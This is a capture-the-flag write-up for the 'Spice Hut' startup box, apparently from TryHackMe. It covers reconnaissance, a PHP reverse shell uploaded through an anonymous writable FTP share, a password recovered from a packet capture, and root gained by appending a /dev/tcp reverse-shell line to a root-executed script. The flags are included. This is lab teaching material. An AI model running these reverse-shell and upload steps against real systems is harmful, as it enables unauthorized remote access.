#CTF 

_**We are Spice Hut,** a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!_

## Recon

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.100.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I found this with gobuster
```
/files                (Status: 301) [Size: 308] [--> http://10.10.56.6/files/]          
```

I navigated to this subdirectory and found a ftp folder with nothing in it, an important.jpg photo with an amongus meme  and a notice txt :
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

Exiftool on the image:
```
ExifTool Version Number         : 12.63
File Name                       : important.png
Directory                       : .
File Size                       : 252 kB
File Modification Date/Time     : 2023:07:27 07:59:20-04:00
File Access Date/Time           : 2023:07:27 07:59:19-04:00
File Inode Change Date/Time     : 2023:07:27 07:59:20-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 735
Image Height                    : 458
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8 8
Image Size                      : 735x458
Megapixels                      : 0.337
```

Tried to run stegseek on it but it doesnt support pngs.
I would love to upload a reverse shell on the ftp and I see that I can login as anonymous.

## Access

When I face this:
`229 Entering Extended Passive Mode (|||15928|)`
I type `passive` and that turns it off.

I upload a reverse shell with
`put /home/kali/php-reverse-shell.php reverse.php`

and then navigate to it on the browser.
I open a Netcat connection and I click the shell and I am in!

I find a recipe.txt file
```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

I find an interesting folder /incidents containing suspicious.pcapng
I open a server with python3 -m http.server 8080 and then on my terminal I 
wget the file I want. Its a pcapng file so I open it with Wireshark.

I take a look on the file and I see the commands the intruder used. Around 85 packet things get interested

```
0000   00 00 03 04 00 06 00 00 00 00 00 00 7d df 08 00   ............}...
0010   45 00 00 62 02 68 40 00 40 06 89 c7 c0 a8 16 8b   E..b.h@.@.......
0020   c0 a8 16 8b 11 5c 9f e6 bf 7f c7 84 2f 35 b0 36   .....\....../5.6
0030   80 18 00 40 ae bb 00 00 01 01 08 0a 2a f3 87 ed   ...@........*...
0040   2a f3 59 fe 70 79 74 68 6f 6e 20 2d 63 20 22 69   *.Y.python -c "i
0050   6d 70 6f 72 74 20 70 74 79 3b 70 74 79 2e 73 70   mport pty;pty.sp
0060   61 77 6e 28 27 2f 62 69 6e 2f 62 61 73 68 27 29   awn('/bin/bash')
0070   22 0a                                             ".
```

I see that he tries to spawn a stable shell.
At 152 they try to cd to lennie and they cant.
At 175
```
0000   00 00 03 04 00 06 00 00 00 00 00 00 00 00 08 00   ................
0010   45 00 00 52 25 08 40 00 40 06 67 37 c0 a8 16 8b   E..R%.@.@.g7....
0020   c0 a8 16 8b 9f e6 11 5c 2f 35 b2 5e bf 7f c7 df   .......\/5.^....
0030   80 18 00 40 ae ab 00 00 01 01 08 0a 2a f4 40 09   ...@........*.@.
0040   2a f4 3f fb 5b 73 75 64 6f 5d 20 70 61 73 73 77   *.?.[sudo] passw
0050   6f 72 64 20 66 6f 72 20 77 77 77 2d 64 61 74 61   ord for www-data
0060   3a 20                                             : 
```

And they get
```
0000   00 00 03 04 00 06 00 00 00 00 00 00 04 06 08 00   ................
0010   45 00 00 47 02 7f 40 00 40 06 89 cb c0 a8 16 8b   E..G..@.@.......
0020   c0 a8 16 8b 11 5c 9f e6 bf 7f c7 df 2f 35 b2 7c   .....\....../5.|
0030   80 18 00 40 ae a0 00 00 01 01 08 0a 2a f4 4a 0e   ...@........*.J.
0040   2a f4 40 09 63 34 6e 74 67 33 74 33 6e 30 75 67   *.@.c4ntg3t3n0ug
0050   68 73 70 31 63 33 0a                              hsp1c3.
```

So I have the password for lennie: c4ntg3t3n0ughsp1c3
And I am in! `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

## Priv Esc

I try to run sudo -l but I get: Sorry, user lennie may not run sudo on startup.

There are two more folders here, Documents and scripts
Documents contain:
concern.txt
```
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie
```

list.txt
```
Shoppinglist: Cyberpunk 2077 | Milk | Dog food
```

and note.txt
```
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
```

On scripts folder there are two more files:
planner.sh 
```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

and startup_list.txt which is empty.

I asked gpt what the code above does and this is what I got

```
This code is a Bash script that performs the following actions:

1. `#!/bin/bash`: This line is called a shebang and indicates that the script should be interpreted and executed using the Bash shell.

2. `echo $LIST > /home/lennie/scripts/startup_list.txt`: This line takes the value stored in the variable `LIST` and writes it to a file called `startup_list.txt` located in the `/home/lennie/scripts/` directory. The `>` symbol is used for output redirection, which means it will create or overwrite the file if it already exists.

3. `/etc/print.sh`: This line executes the script located at `/etc/print.sh`.  

However, there is one potential issue with the code. The variable `$LIST` is used without being defined or assigned a value within the script. If `$LIST` has not been defined or set before this line, it will be treated as an empty variable, and the `startup_list.txt` file will contain no content.

To better understand the purpose and functionality of the script, we would need to know the contents of the `/etc/print.sh` script and how the `$LIST` variable is supposed to be populated before running this script.
```

I try to run the script but I get this
```
./planner.sh: line 2: /home/lennie/scripts/startup_list.txt: Permission denied
Done!
```
and the startup_list.txt is still empty

Next I navigate to /etc/print.sh
```
#!/bin/bash
echo "Done!"
```

I am a little a bit stuck here. I search online and I find that planner.sh, owned by lennie is calls print.sh , owned by root. So if I change the code on print I can call a reverse-shell
`echo " /bin/bash -i >& /dev/tcp/[local ip]/3456 0>&1" >> /etc/print.sh`

I open a nc connection to 3456 and I wait for the connection, and after a bit I am root !
`THM{f963aaa6a430f210222158ae15c3d76d}`